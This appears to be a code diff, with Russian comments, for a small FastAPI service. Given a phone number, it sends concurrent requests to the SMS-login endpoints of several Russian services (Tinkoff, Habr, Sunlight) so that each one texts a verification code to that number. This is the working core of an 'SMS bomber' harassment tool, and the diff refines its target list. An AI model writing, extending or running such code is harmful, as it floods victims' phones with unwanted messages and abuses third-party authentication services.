@@ -26,7 +26,7 @@ async def send_sms_request(url: str, json_data: dict):
         except Exception:
             return None
 
-# ТЕПЕРЬ СЕРВЕР ПРИМЕТ ЗАПРОС, ДАЖЕ ЕСЛИ ССЫЛКА СЛУЧАЙНО ОБРЕЖЕТСЯ ДО КОРНЯ
+# Сервер примет запрос как на /api/send, так и на главную страницу /
 @app.post("/")
 @app.post("/api/send")
 async def start_sms(data: PhoneRequest):
@@ -37,10 +37,20 @@ async def start_sms(data: PhoneRequest):
     p_plus = f"+{phone}"
     p_7 = phone
 
+    # ТОЧНЫЕ АДРЕСА ДЛЯ ОТПРАВКИ СМС-КОДОВ
     targets = [
-        {"url": "https://tinkoff.ru", "data": {"phone": p_plus}},
-        {"url": "https://habr.com", "data": {"phone": p_plus}},
-        {"url": "https://api.sunlight.net/v3/customers/authorization/", "data": {"phone": p_7}}
+        {
+            "url": "https://tinkoff.ru", 
+            "data": {"phone": p_plus}
+        },
+        {
+            "url": "https://habr.com", 
+            "data": {"phone": p_plus}
+        },
+        {
+            "url": "https://api.sunlight.net/v3/customers/authorization/", 
+            "data": {"phone": p_7}
+        }
     ]
 
     tasks = [send_sms_request(t["url"], t["data"]) for t in targets]
